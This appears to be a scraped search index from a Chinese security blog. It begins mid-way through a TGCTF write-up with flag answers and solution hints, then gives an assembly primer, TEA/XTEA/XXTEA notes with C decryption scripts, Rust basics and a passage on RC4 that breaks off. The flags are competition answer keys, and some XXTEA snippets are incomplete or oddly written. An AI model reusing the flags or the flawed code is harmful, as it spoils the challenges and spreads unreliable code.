}\n组合起来：\nTGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}\n费克特尔\r直接分解n就行\nmm不躲猫猫\r第一组和第三组的n有一个公因数，于是就分解出来了\n宝宝RSA\r第一部分e是素数并且范围比较小直接爆破，第二部分e=3直接开3次根就得到flag\ntRwSiAns\r扔到sagemath里解有限域一元二次方程就行了\nMisc\rwhere it is(osint)\r题目说flag形式为TGCTF{右上角轨道到站的站名}\n谷歌搜图，定位到港墘站\nflag{港墘站}\n好运来\r我听到了强运的回响，flag是CTFer最喜欢的数字：\nTGCTF{114514}\n简单签到，关注：”杭师大网安“谢谢喵🐱\r关注就发flag（）\n","date":"2025-06-01T10:31:51+08:00","permalink":"https://Oight.github.io/p/tgctf%E9%83%A8%E5%88%86wp/","title":"TGCTF部分WP"},{"content":"Windows内核逆向比较深入底层，从底层开始学习更有利于进步，因此在这里作长文整理一下\n汇编语言学习\r众所周知，在高级语言诞生前，专家们都是手搓二进制来使电脑运行的，不过这样未免太过于费专家，为了解决二进制可读性太差，完全不知道计算机在干什么的问题，工程师将那些指令写成了八进制。二进制转八进制是轻而易举的，但是八进制的可读性也不行。很自然地，最后还是用文字表达，加法指令写成 ADD。内存地址也不再直接引用，而是用标签表示。\n这样的话，就多出一个步骤，要把这些文字指令翻译成二进制，这个步骤就称为 assembling，完成这个步骤的程序就叫做 assembler。它处理的文本，自然就叫做 aseembly code。标准化以后，称为 assembly language，缩写为 asm，中文译为汇编语言。\n在早期的高级语言中（如C/C++）在编译时都是先将代码转换成汇编语言，再转换为机器语言来执行的\n请先了解寄存器和内存模型（详情参阅计算机组成原理）\n寄存器与内存\r寄存器\r我们都知道 Cache ，而寄存器（registers）是比 Cache 更加底层的用于存储数据并与计算机交互的东西，计算机中最频繁读写的数据，都会放进寄存器中，CPU优先读写寄存器，再由寄存器和内存交换数据\n早期的x86 CPU 只有8个寄存器（当然现在有很多了），并且每个都有不同的用途。来看看有哪些：\n1 2 3 4 5 6 7 8 EAX EBX ECX EDX EDI ESI EBP ESP 其中前七个是通用寄存器，而ESP寄存器用来存储当前Stack的地址\n我们常常看到32位，64位CPU就是指寄存器的大小。\n内存\r程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从0x1000到0x8000，起始地址是较小的那个地址，结束地址是较大的那个地址。\nHeap\rHeap（堆），在操作系统分配给程序的内存中，堆用来存储用户请求的数据，比如用户输入，堆中的数据由低位向高位增长，同时，存储在堆中的数据需要手动释放（或借助垃圾回收机制）\n一般来说，堆中的数据都是长度不定的，不明确的数据\nStack\rStack（栈），栈是具有特定大小和格式的内存空间，用于存储明确的数据，如字符串字面量，也可以用于存储指针，栈在作用域结束后会自动释放内存。\n例如：\n1 2 3 4 int main() { int a = 2; int b = 3; } 这个C代码运行main函数时，系统会为它在内存中建立一个帧（frame），所有main的内部变量（比如a和b）都保存在这个帧里面。main函数执行结束后，该帧就会被回收，释放所有的内部变量，不再占用空间。\n一个程序里有多少函数，就会有多少个栈帧，一般来说，调用栈有多少层，就有多少帧。每一层函数执行完毕，栈帧就会被回收，然后程序执行下一层，通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。\n所有的帧都存放在 Stack，由于帧是一层层叠加的，所以 Stack 叫做栈。生成新的帧，叫做”入栈”，英文是 push；栈的回收叫做”出栈”，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做”后进先出”的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。\nStack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。比如，内存区域的结束地址是0x8000，第一帧假定是16字节，那么下一次分配的地址就会从0x7FF0开始；第二帧假定需要64字节，那么地址就会移动到0x7FB0。\n汇编指令\r我们来看一个简单的C程序：\n1 2 3 4 5 6 7 int add_a_and_b(int a, int b) { return a + b; } int main() { return add_a_and_b(2, 3); } gcc 将这个程序转成汇编语言。\n1 $ gcc -S example.c 上面的命令执行以后，会生成一个文本文件example.s，里面就是汇编语言，包含了几十行指令。这么说吧，一个高级语言的简单操作，底层可能由几个，甚至几十个 CPU 指令构成。CPU 依次执行这些指令，完成这一步操作。\nexample.s经过简化以后，大概是下面的样子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 _add_a_and_b: push %ebx mov %eax, [%esp+8] mov %ebx, [%esp+12] add %eax, %ebx pop %ebx ret _main: push 3 push 2 call _add_a_and_b add %esp, 8 ret 我们来具体看看每一行函数的实现过程:\n我们知道main函数是程序的入口处，大多数程序也是从这里开始执行的，所以我们先看看main函数\npush 3\n首先是将 3 压入栈中，虽然看上去很简单，push指令其实有一个前置操作。它会先取出 ESP 寄存器里面的地址，将其减去4个字节，然后将新地址写入 ESP 寄存器。使用减法是因为 Stack 从高位向低位发展，4个字节则是因为3的类型是int，占用4个字节。得到新地址以后， 3 就会写入这个地址开始的四个字节。\n你可能很疑惑，为什么是 ESP 寄存器，还记得我们前面说过， ESP 寄存器是干嘛的吗？它是用来存储当前Stack的地址的，所以会首先对 ESP 寄存器进行操作。\n我们继续看，这里减去4个字节的操作就相当于是把3存在了这里，因为3占用了4个字节\npush 2\n同样的，这里将 2 压入栈中，位置紧贴着 3 ，这时 ESP 寄存器会再减去4个字节（累计减去8）\n然后到\ncall _add_a_and_b\n这里的call指令用来调用函数，这时我们进 _add_a_and_b 函数看看\n1 push %ebx 这一行表示将 EBX 寄存器里面的值，写入_add_a_and_b这个帧。这是因为后面要用到这个寄存器，就先把里面的值取出来，用完后再写回去。\n这时，push指令会再将 ESP 寄存器里面的地址减去4个字节（累计减去12）。\n1 mov %eax, [%esp+8] 这里表示给 ESP 寄存器里面的地址加上8个字节，然后存储到 EAX 寄存器中，（即把2从 ESP 寄存器中取出，放进 EAX 寄存器中）\n1 mov %ebx, [%esp+12] 同样的，这里给 ESP 寄存器里面的地址加上12个字节，然后存储到 EAX 寄存器中，（即把3从 ESP 寄存器中取出，放进 EBX 寄存器中）\n1 add %eax, %ebx 然后是 add 指令，add 指令用于将两个运算子相加（%ebx是该指令要用到的运算子。一个 CPU 指令可以有零个到多个运算子。）\n这里是把 EBX 寄存器中的值（3）和 EAX 寄存器中的值（2）相加，然后存储到第一个运算子（EAX寄存器）中\n1 pop %ebx EBX 寄存器已经没有用武之地了，所以把它推出栈，pop指令用于取出 Stack 最近一个写入的值（即最低位地址的值），并将这个值写入运算子指定的位置。\n上面的代码表示，取出 Stack 最近写入的值（即 EBX 寄存器的原始值），再将这个值写回 EBX 寄存器（因为加法已经做完了，EBX 寄存器用不到了）。\n注意，pop指令还会将 ESP 寄存器里面的地址加4，即回收4个字节。（这里就是在内存回收）\n1 ret ret指令用于终止当前函数的执行，将运行权交还给上层函数。也就是，当前函数的帧将被回收。\n所以 _add_a_and_b 函数以及执行完了，我们回到 main 函数中去\n1 add %esp, 8 这里给 ESP 寄存器的地址加上8 因为我们的结果已经写入到了 EAX 寄存器中，这里 ESP 寄存器已经用不到了，所以回收它的内存，给它的地址加上8个字节使其恢复原位\n1 ret 最后 main 函数结束，程序运行完毕\n","date":"2025-06-01T10:31:36+08:00","image":"https://old.roi4cio.com/fileadmin/user_upload/Microsoft_Windows.png","permalink":"https://Oight.github.io/p/windows%E5%86%85%E6%A0%B8%E9%80%86%E5%90%91/","title":"Windows内核逆向"},{"content":"逆向算法复习第二弹：Tea系列算法\nTea算法\r“TEA” 的全称为”Tiny Encryption Algorithm” 由于实现简单，加密安全（QQ和微信的一些协议中就是使用的Tea加密），深受ctf出题人的喜爱。因此tea算法成为ctf REer的一种必学算法。TEA算法使用64位的明文分组和128位的密钥，它使用Feistel分组加密框架，需要进行 64 轮迭代。该算法使用了一个神秘常数δ作为倍数，它来源于黄金比率2654435769 （0x9E3779B9），以保证每一轮加密都不相同。\nTea算法实现：\r加密\r加密代码：\n1 2 3 4 5 6 7 8 9 10 11 12 c void encrypt(uint32_t* v,uint32_t* key){ uint32_t v0=v[0],v1=v[1],sum=0,i; uint32_t delta=0x9e3779b9; uint32_t k0=key[0],k1=key[1],k2=key[2],k3=key[3]; for(i=0;i\u0026lt;32;i++){ sum+=delta; v0+=((v1\u0026lt;\u0026lt;4)+k0)^(v1+sum)^((v1\u0026gt;\u0026gt;5)+k1); v1+=((v0\u0026lt;\u0026lt;4)+k2)^(v0+sum)^((v0\u0026gt;\u0026gt;5)+k3); } v[0]=v0;v[1]=v1; } 解密\r加密过程很清晰，那么解密过程我们只要把它倒过来写就好\n1 2 3 4 5 6 7 8 9 10 11 void decrypt(uint32_t* v,uint32_t* key){ uint32_t v0=v[0],v1=v[1],sum=0xC6EF3720,i; uint32_t delta=0x9e3779b9; uint32_t k0=key[0],k1=key[1],k2=key[2],k3=key[3]; for(i=0;i\u0026lt;32;i++){ v1-=((v0\u0026lt;\u0026lt;4)+k2)^(v0+sum)^((v0\u0026gt;\u0026gt;5)+k3); v0-=((v1\u0026lt;\u0026lt;4)+k0)^(v1+sum)^((v1\u0026gt;\u0026gt;5)+k1); sum-=delta; } v[0]=v0;v[1]=v1; } 不难看出其实Tea算法有很鲜明的特征：\n1 2 3 4 5 可能存在针对64bit以及128bit数字的操作（输入的msg和key） 存在先进行位移，然后异或的类似操作（(z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2)这类混合变换） 前面一个复杂的混合变换的结果可能会叠加到另一个值上，两者相互叠加（Feistel 结构） 获取密钥的时候，会使用某一个常量值作为下标（key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]） 会在算法开始定义一个delta，并且这个值不断的参与算法，但是从来不会受到输入的影响（delta数值，根据见过的题目中很少会直接使用0x9e3779b9） 即32或64轮加密，以及有一个关键的delta值，难点主要是如何从出题人魔改过的代码中找到v0，v1，delta以及加密过程。\n解密脚本可以参考知识库中现有的脚本，改改加密方式，delta值这些就好\n脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 c //tea #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void Decrypt(uint32_t* data, uint32_t* key) { uint32_t v0 = data[0], v1 = data[1]; uint32_t delta = 0x9e3779b9; uint32_t sum = delta * 32; for (int i = 0; i \u0026lt; 32; i++) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + key[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + key[3]); v0 -= ((v1 \u0026lt;\u0026lt; 4) + key[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + key[1]); sum -= delta; } data[0] = v0; data[1] = v1; } int main() { uint32_t encryptedData[] = { 0xc873914f, 0x4a628600, 0x20c77a1c, 0x1a877aaa, 0xd6faa982, 0x60d1c964, 0xb9884c32, 0x2a08a862, 0xc74a0036, 0x8f2ee196, 0xef08a6a9, 0xa3850896 }; uint32_t key[] = { 0x11111111, 0x11111111, 0x11111111, 0x11111111 }; int dataSize = sizeof(encryptedData) / sizeof(encryptedData[0]); for (int i = 0; i \u0026lt; dataSize; i += 2) { Decrypt(\u0026amp;encryptedData[i], key); } int decryptedSize = dataSize * 4 + 1; char* decryptedString = (char*)malloc(decryptedSize); memset(decryptedString, 0, decryptedSize); for (int i = 0; i \u0026lt; dataSize; i++) { char* bytes = (char*)\u0026amp;encryptedData[i]; decryptedString[i * 4] = bytes[0]; decryptedString[i * 4 + 1] = bytes[1]; decryptedString[i * 4 + 2] = bytes[2]; decryptedString[i * 4 + 3] = bytes[3]; } printf(\u0026#34;Decrypted String: %s\\n\u0026#34;, decryptedString); free(decryptedString); return 0; } xTea算法\rTEA 算法发布不久，被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本——XTEA（有时也被称为“tean”）。XTEA 跟 TEA 使用了相同的简单运算，但它采用了截然不同的顺序，为了阻止密钥表攻击，四个子密钥（在加密过程中，原 128 位的密钥被拆分为 4 个 32 位的子密钥）采用了一种不太正规的方式进行混合。总的来说 xTEA就是在TEA算法基础上加了一些内容，而加解密过程基本没变。\n加解密：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i \u0026lt; num_rounds; i++) { v0 += (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); sum += delta; v1 += (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); } v[0]=v0; v[1]=v1; } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i \u0026lt; num_rounds; i++) { v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum\u0026gt;\u0026gt;11) \u0026amp; 3]); sum -= delta; v0 -= (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); } v[0]=v0; v[1]=v1; } int main() { uint32_t v[2]={1,2}; uint32_t const k[4]={2,2,3,4}; unsigned int r=32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(\u0026#34;加密前原始数据：%u %u\\n\u0026#34;,v[0],v[1]); encipher(r, v, k); printf(\u0026#34;加密后的数据：%u %u\\n\u0026#34;,v[0],v[1]); decipher(r, v, k); printf(\u0026#34;解密后的数据：%u %u\\n\u0026#34;,v[0],v[1]); return 0; } xxTea算法\r相比TEA,xTEA算法，xxTEA算法的优势是原字符串长度可以不是4的倍数了\n加密过程：\r加密：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x9e3779b9 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2)+(y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4))^((sum^y)+(key[(p\u0026amp;3)^e]^z))) void btea(uint32_t *v,int n,uint32_t const key[4])//n为v数组长度 { uint32_t y,z,sum; unsigned p,rounds,e; if(n\u0026gt;1) { rounds=6+52/n; sum=0; z=v[n-1]; do { sum+=DELTA;//循环加密过程 e=(sum\u0026gt;\u0026gt;2)\u0026amp;3; for(p=0;p\u0026lt;n-1;p++) { y=v[p+1]; v[p]+=MX; z=v[p]; } y=v[0]; z=v[n-1]+=MX; } while(--rounds); } } 解密过程：\r解密：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x9e3779b9 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2)+(y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4))^((sum^y)+(key[(p\u0026amp;3)^e]^z))) void dtea(uint32_t *v,int n,uint32_t const key[4])//n为v数组长度 { rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } xxTea算法的特征：\n1 2 3 4 5 1. key 128 bit 2. enc =\u0026gt; 32*i(i=\u0026gt;2) 3. 特征量`0x9e3779b9` 4. 两层循环，通常记住最外层的循环为rounds=6+52/n 5. 5,2,3,4 左右移操作 解密脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x9e3779b9 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2) + (y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4)) ^ ((sum^y) + (key[(p\u0026amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u0026gt; 1) /* Encoding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=0; p\u0026lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n \u0026lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { uint32_t v[2]= {1,2}; uint32_t const k[4]= {2,2,3,4}; int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(\u0026#34;加密前原始数据：%u %u\\n\u0026#34;,v[0],v[1]); btea(v, n, k); printf(\u0026#34;加密后的数据：%u %u\\n\u0026#34;,v[0],v[1]); btea(v, -n, k); printf(\u0026#34;解密后的数据：%u %u\\n\u0026#34;,v[0],v[1]); return 0; } //////////////////////同x///////////////////////////// #include \u0026lt;stdint.h\u0026gt; /* XXTEA加密算法的加密过程 */ void xxtea_encrypt(uint32_t *v, int n, uint32_t *key) { uint32_t y, z, sum, delta, e; uint32_t p, q, rounds, limit; uint32_t *k = key; rounds = 6 + 52 / n; // 计算加密轮数 sum = 0; delta = 0x9E3779B9; // 初始化delta常数 limit = rounds * delta; // 计算sum的最大值 q = 6 + limit / delta; while (q-- \u0026gt; 0) { // 执行加密轮数 sum += delta; // 更新sum e = sum \u0026gt;\u0026gt; 2 \u0026amp; 3; // 计算e值 for (p = 0; p \u0026lt; n; p++) { // 对每个数据块执行加密操作 y = v[(p + 1) % n]; z = v[p] += ((v[(p + n - 1) % n] \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (v[(p + n - 1) % n] \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (k[(p ^ e) \u0026amp; 3] ^ v[(p + n - 1) % n])); // 计算加密后的数据块 } } } /* XXTEA加密算法的解密过程 */ void xxtea_decrypt(uint32_t *v, int n, uint32_t *key) { uint32_t y, z, sum, delta, e; uint32_t p, q, rounds, limit; uint32_t *k = key; rounds = 6 + 52 / n; // 计算加密轮数 sum = rounds * 0x9E3779B9; // 初始化sum常数 delta = 0x9E3779B9; // 初始化delta常数 limit = rounds * delta; // 计算sum的最大值 q = 6 + limit / delta; while (q-- \u0026gt; 0) { // 执行加密轮数 e = sum \u0026gt;\u0026gt; 2 \u0026amp; 3; // 计算e值 for (p = n - 1; p \u0026gt; 0; p--) { // 对每个数据块执行解密操作 z = v[(p + n - 1) % n]; y = v[p] -= ((v[(p + n - 1) % n] \u0026gt;\u0026gt; 5) ^ (v[(p + 1) % n] \u0026lt;\u0026lt; 2)) + ((v[(p + 1) % n] \u0026gt;\u0026gt; 3) ^ (v[(p + n - 1) % n] \u0026lt;\u0026lt; 4)) ^ ((sum ^ v[(p + 1) % n]) + (k[(p ^ e) \u0026amp; 3] ^ v[(p + n - 1) % n])); // 计算解密后的数据块 } z = v[(n + n - 1) % n]; y = v[0] -= ((v[(n + n - 1) % n] \u0026gt;\u0026gt; 5) ^ (v[(1) % n] \u0026lt;\u0026lt; 2)) + ((v[(1) % n] \u0026gt;\u0026gt; 3) ^ (v[(n + n - 1) % n] \u0026lt;\u0026lt; 4)) ^ ((sum ^ v[(1) % n]) + (k[(0 ^ e) \u0026amp; 3] ^ v[(n + n - 1) % n])); // 特殊处理第一个和最后一个数据块 sum -= delta; // 更新sum } } Tea系列算法特征总结：\r根据上文对tea算法的源码分析，我们得出TEA算法的如下特征：\nkey 128 bit {2,2,3,4} 传入两个32位无符号整数 三个累加量，其中最后赋值给传入的参数 存在\u0026laquo;4 , \u0026raquo;5 , xor等操作 特征量：0x9e3779b9\n至于xTEA,xxTEA等TEA算法的特殊变种，由于都是在原始TEA算法上做的局部改动，特征上与tea算法没有本质上的不同，只不过可能有位运算位数不同。具体区别如下：\n相同点：\nkey 128 bit特征量0x9e3779b9 主要加密部分进行移位和异或操作 首先如果题目中出现常量0x9e3779b9，那么肯定是Tea相关算法了。 区分： Tea的主加密部分为\u0026lt;\u0026lt;4,\u0026gt;\u0026gt;5,xor，循环32轮 xTea的主加密部分\u0026lt;\u0026lt;4,\u0026gt;\u0026gt;5,\u0026gt;\u0026gt;11,xor,循环次数不定，但通常也为32轮，需要传入3个参数 xxTea的主加密部分\u0026gt;\u0026gt;5,\u0026lt;\u0026lt;2,\u0026gt;\u0026gt;3,\u0026lt;\u0026lt;4,xor,循环次数为6+52/n，enc长度大于64 难点还是在代码审计部分，学好C语言非常重要\n参考：\nRE与算法-tea加密算法\nTEA系列算法101\nTEA/XTEA/XXTEA系列算法\nTEA算法解析\n十分钟带你吃透TEA算法 这个视频挺适合入门\n","date":"2025-06-01T10:31:23+08:00","image":"https://assets.animemotivation.com/wp-content/uploads/2017/07/Darjeeling-Girls-Und-Panzer.jpg","permalink":"https://Oight.github.io/p/tea/","title":"Tea"},{"content":"在网络安全的学习中越来越发现没有编程基础寸步难行，同时我也想要学习相关的程序开发，因为Rust功能强大，并且是系统语言，或许算比较适合我的语言？（但愿吧）\n后记：家人们，不要学习Rust，这是我第 二 三 四 五 六次入门Rust\n我主要是从以下的文章中学习Rust，但是发现每个教程都有不太面向初学者的部分，因此我做一下梳理，也方便我后面查缺补漏。\nRust 程序设计语言\nRust 程序设计语言 简体中文版\nRust语言圣经(Rust Course)\nRust语言中文版\nRust 参考手册 中文版\n通过例子学 Rust 中文版\nRust 教程\nRust输出\r我们将以菜鸟教程上的顺序来进行。\n第一步，经典的Hello,world\nHello，World！\r创建项目目录\r这一步是每个Rust程序的开端，每一个伟大的项目都起源于此。\n我们使用cargo来创建一个名为Hello_World的项目：\ncargo new Hello_World\n然后我们需要进入到我们新创建的Hello_World目录下，这将是我们经常用到的，\ncd Hello_World\n有时候发现程序无法编译？先看看是否进入了正确的项目目录下。\n我们来看看这个项目的项目结构：\n1 2 3 4 5 6 7 $ tree . ├── .git ├── .gitignore ├── Cargo.toml └── src └── main.rs 其中，Cargo.toml 是 cargo 特有的项目数据描述文件。它存储了项目的所有元配置信息，如果 Rust 开发者希望 Rust 项目能够按照期望的方式进行构建、测试和运行，那么，必须按照合理的方式构建 Cargo.toml 。我们可以理解为这里存储了这个项目中所有我们需要的依赖库，我们在这里告诉程序我们要导入哪些库。\n_Cargo.toml_一般是这个样子：\n1 2 3 4 5 6 7 8 // package 配置段落 [package] name = \u0026#34;world_hello\u0026#34; version = \u0026#34;0.1.0\u0026#34; edition = \u0026#34;2021\u0026#34; // 定义项目依赖 [dependencies] // 这里刚打开是空的，我们需要把我们要的库复制到这里 main函数\r接下来我们来看看 main.rs ，此文件是当前 Rust 工程的入口文件，每一个新建的Rust项目都会有这个文件。\n我们来看看这个文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 这是注释内容，将会被编译器忽略掉 // 可以单击那边的按钮 \u0026#34;Run\u0026#34; 来测试这段代码 -\u0026gt; // 若想用键盘操作，可以使用快捷键 \u0026#34;Ctrl + Enter\u0026#34; 来运行 // 这段代码支持编辑，你可以自由地修改代码！ // 通过单击 \u0026#34;Reset\u0026#34; 按钮可以使代码恢复到初始状态 -\u0026gt; // 这是主函数 fn main() { // 调用编译生成的可执行文件时，这里的语句将被运行。 // 将文本打印到控制台 println!(\u0026#34;Hello World!\u0026#34;); } 这几行定义了一个名叫 main 的函数。main 函数是一个特殊的函数：在可执行的 Rust 程序中，它总是最先运行的代码。第一行代码声明了一个叫做 main 的函数，它没有参数也没有返回值。如果有参数的话，它们的名称应该出现在小括号 () 中。\n函数体被包裹在 {} 中。Rust 要求所有函数体都要用花括号包裹起来。一般来说，将左花括号与函数声明置于同一行并以空格分隔，是良好的代码风格。\n很简单吧，fn 是定义函数，main是函数名，被{}包裹起来的是函数体。\n在函数体中，我们看到使用println!(\u0026quot;Hello World!\u0026quot;);输出了 Hello World！\n这里有几个点需要注意一下，在Rust中 println! 调用了一个 Rust 宏（macro）。如果是调用函数，则应输入 println（没有!） 关于宏，我们后面再说，现在你只需记住，当看到符号 ! 的时候，就意味着调用的是宏而不是普通函数，并且宏并不总是遵循与函数相同的规则。\n另外，这个语句以;结尾，Rust中的大多数语句都以 ; 结尾，但 ; 并不是简单的行与行之间的分割符，而是标致着一个语句的结束。在语句未结束时使用 ; 是错误的。\n例如：\n1 2 3 fn add_one(x: i32) -\u0026gt;i32 { x + 1 } 这里会返回一个 i32 的值，但如果加了 ; 它会返回()\n这里简单的提一嘴，并不是我们现在要讨论的核心，但这个小知识点还是要记住的。\n现在我们让它跑起来：\n在终端中，我们输入：\ncargo run\n就会得到Hello World!\n编译与运行\r通过上面那个例子，我们不难发现Rust的编译和运行是分开的，我们可以直接让它快速执行编译，也可以先编译然后再运行，不过总之都是要编译的，这也是系统语言和脚本语言的一大不同点。\n我们使用：\ncargo build\n来编译我们我们的程序\n然后使用：\ncargo run\n来让项目跑起来。\nCargo 还提供了一个名为 cargo check 的命令。该命令快速检查代码确保其可以编译，但并不产生可执行文件：\ncargo check\ncargo check 是我们在代码开发过程中最常用的命令，它的作用很简单：快速的检查一下代码能否编译通过。因此该命令速度会非常快，能节省大量的编译时间。\nBTW, 以上的编译和运行都是在debug模式下进行的，在这种模式下，代码的编译速度会非常快，可是福兮祸所伏，运行速度就慢了. 原因是，在 debug 模式下，Rust 编译器不会做任何的优化，只为了尽快的编译完成，让你的开发流程更加顺畅。\n如果想要高性能的代码，我们可以在命令后面加上 --release :\ncargo run –release cargo build –release\n[!NOTE]\nrust自身是使用rustc进行编译的， rustc,rustup和cargo之间的关系可以理解为rustc是编译器，rustup是更新器，cargo是包管理器\nRust 基础语法\r变量，基本类型，函数，注释和控制流，这些几乎是每种编程语言都具有的编程概念。\n这些基础概念将存在于每个 Rust 程序中，及早学习它们将使你以最快的速度学习 Rust 的使用。\n变量\r首先必须说明，Rust 是强类型语言，但具有自动判断变量类型的能力。这很容易让人与弱类型语言产生混淆。\n默认情况下，Rust 中的变量是不可变的，除非使用 mut 关键字声明为可变变量。\n1 2 let a = 123; // 不可变变量 let mut b = 10; // 可变变量 如果要声明变量，需要使用 let 关键字。例如：\n1 let a = 123; ","date":"2025-06-01T10:31:09+08:00","image":"https://openingsource.org/wp-content/uploads/2018/02/rust_logo-1024x460.jpg","permalink":"https://Oight.github.io/p/rust%E5%AD%A6%E4%B9%A0/","title":"Rust学习"},{"content":"精力一直放在Web和一些奇奇怪怪的东西上（比如 rust web应用()），突然发现好久没做逆向题了，知识点都忘记了很多，甚至IDA都不会用了（其实本来就不怎么会用()）\n所以重新学一下逆向的一些知识，顺便进行一些梳理和整合。\nRC4算法\nRC4加密算法是一种对称加密算法。\n什么是对称加密算法？\n对称加密(也叫私钥加密)指加密和解密使用相同密钥的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。它要求发送方和接收方在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都可以对他们发送或接收的消息解密，所以密钥的保密性对通信的安全性至关重要。\nRC4算法实现过程\rRC4算法包括初始化算法(KSA)和随即子密码生成算法(PRGA)两部分。\nKSA\r我们先来看看算法中的初始化部分\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 c /*初始化函数*/ void rc4_init(unsigned char*s,unsigned char*key, unsigned long Len) { int i=0,j=0; char k[256]={0}; unsigned char tmp=0; for(i=0;i\u0026lt;256;i++) { s[i]=i; k[i]=key[i%Len]; } for(i=0;i\u0026lt;256;i++) { j=(j+s[i]+k[i])%256; tmp=s[i]; s[i]=s[j];//交换s[i]和s[j] s[j]=tmp; } } 参数1是一个256长度的char型数组，定义为: unsigned char sBox[256];\n参数2是密钥，其内容可以随便定义：char key[256];\n参数3是密钥的长度，Len = strlen(key);\n初始化的过程是先有一个sbox(s盒)，s盒的长度是256，然后有一个随意长度的密钥，一个中间的临时变量(tmp)，在初始化的过程中，先定义一个 i ，将 i 从0开始到255以此遍历填充进s盒中；然后定义一个 